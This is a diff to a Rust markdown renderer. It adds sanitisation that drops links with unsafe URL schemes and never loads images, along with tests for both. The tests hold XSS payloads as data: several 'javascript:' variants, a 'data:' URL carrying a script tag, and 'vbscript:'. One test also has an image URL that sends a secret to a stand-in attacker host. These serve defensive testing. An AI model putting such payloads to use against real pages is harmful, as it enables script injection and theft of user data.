@@ -8,8 +8,36 @@
 //! Sanitisation XSS : pulldown-cmark ne filtre PAS le HTML brut, on jette
 //! donc tous les événements `Html`/`InlineHtml` du parseur avant rendu.
 //! Le texte ordinaire est échappé par le renderer.
+//!
+//! Links and images (R11, SEC-W1): pulldown-cmark does not filter URL
+//! schemes. A link keeps its target only for `http(s):`, `mailto:` or a
+//! relative URL — anything else (`javascript:`, `data:`…) renders as its
+//! text. Images never load (a remote `![](…)` would leak the conversation on
+//! render, zero click): only their alt text is shown.
 
-use pulldown_cmark::{Event, Options, Parser};
+use pulldown_cmark::{Event, Options, Parser, Tag, TagEnd};
+
+/// URL a rendered link may point to: `http(s):`, `mailto:` or relative.
+/// Browsers ignore ASCII whitespace / control characters inside a scheme
+/// (`java\tscript:`), so they are stripped before the check.
+fn safe_href(url: &str) -> bool {
+    let cleaned: String = url
+        .chars()
+        .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
+        .collect();
+    let lower = cleaned.to_ascii_lowercase();
+    // A scheme is what precedes the first ':' — unless a '/', '?' or '#'
+    // comes first (relative URL such as `/flows?id=1:2`).
+    match lower.find(':') {
+        None => true,
+        Some(colon) => {
+            if lower[..colon].contains(['/', '?', '#']) {
+                return true;
+            }
+            matches!(&lower[..colon], "http" | "https" | "mailto")
+        }
+    }
+}
 
 /// Heuristique de détection : la réponse contient-elle du markdown qu'on
 /// veut rendre (table, code, gras/italique, titre, liste) ? Sinon on
@@ -55,10 +83,23 @@ pub fn to_html(text: &str) -> String {
     let mut options = Options::empty();
     options.insert(Options::ENABLE_TABLES);
     options.insert(Options::ENABLE_STRIKETHROUGH);
-    let parser = Parser::new_ext(text, options).filter_map(|event| match event {
+    // One entry per open link: was it dropped (unsafe target)?
+    let mut links: Vec<bool> = Vec::new();
+    let parser = Parser::new_ext(text, options).filter_map(move |event| match event {
         // HTML brut jeté (sanitisation) ; le contenu texte d'un bloc de
         // code arrive en Event::Text, il n'est pas touché.
         Event::Html(_) | Event::InlineHtml(_) => None,
+        Event::Start(Tag::Link { ref dest_url, .. }) => {
+            let keep = safe_href(dest_url);
+            links.push(!keep);
+            keep.then_some(event)
+        }
+        Event::End(TagEnd::Link) => {
+            let dropped = links.pop().unwrap_or(false);
+            (!dropped).then_some(event)
+        }
+        // Images: the alt text (inner events) stays, the <img> never.
+        Event::Start(Tag::Image { .. }) | Event::End(TagEnd::Image) => None,
         other => Some(other),
     });
     let mut html = String::with_capacity(text.len() + 64);
@@ -98,6 +139,45 @@ mod tests {
         let html = to_html("<img src=x onerror=alert(1)> ok");
         assert!(!html.contains("<img"));
         assert!(html.contains("ok"));
+    }
+
+    #[test]
+    fn unsafe_links_render_as_text() {
+        for url in [
+            "javascript:alert(1)",
+            "JaVaScRiPt:alert(1)",
+            "java\tscript:alert(1)",
+            " javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "vbscript:x",
+        ] {
+            let html = to_html(&format!("[Fix it]({url}) end"));
+            assert!(!html.contains("<a"), "{url} kept: {html}");
+            assert!(html.contains("Fix it"), "{url} lost its text: {html}");
+        }
+    }
+
+    #[test]
+    fn safe_links_are_kept() {
+        for url in [
+            "https://pnex.io/docs",
+            "http://192.168.1.2:5150/",
+            "mailto:ops@example.com",
+            "/flows?id=12",
+            "/flows?at=12:30",
+            "#section",
+        ] {
+            let html = to_html(&format!("[go]({url})"));
+            assert!(html.contains("<a href="), "{url} dropped: {html}");
+        }
+    }
+
+    #[test]
+    fn images_never_load() {
+        let html = to_html("![leak](https://attacker.example/?q=secret) after");
+        assert!(!html.contains("<img"));
+        assert!(html.contains("leak"));
+        assert!(html.contains("after"));
     }
 
     #[test]
